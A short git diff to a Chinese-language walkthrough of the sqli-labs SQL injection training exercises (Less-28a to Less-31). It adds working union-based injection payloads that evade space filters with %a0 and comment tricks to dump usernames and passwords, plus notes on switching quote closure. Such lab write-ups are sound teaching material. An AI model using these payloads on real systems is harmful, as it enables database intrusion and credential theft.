@@ -1030,3 +1030,21 @@ $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and passwor
 
 传入`?id=0')%a0union%a0select%a01,(select%a0group_concat(password)%a0from%a0users),('3`得到密码
 
+### Less-28a
+
+同上
+
+### Less-29
+
+传入`?id=-1'/**/union/**/select/**/1,(select/**/group_concat(username)/**/from/**/users),'3`得到用户名
+
+传入`?id=-1'/**/union/**/select/**/1,(select/**/group_concat(password)/**/from/**/users),'3`得到密码
+
+### Less-30
+
+将闭合方式更换为`"`
+
+### Less-31
+
+将闭合方式更换为`")`
+
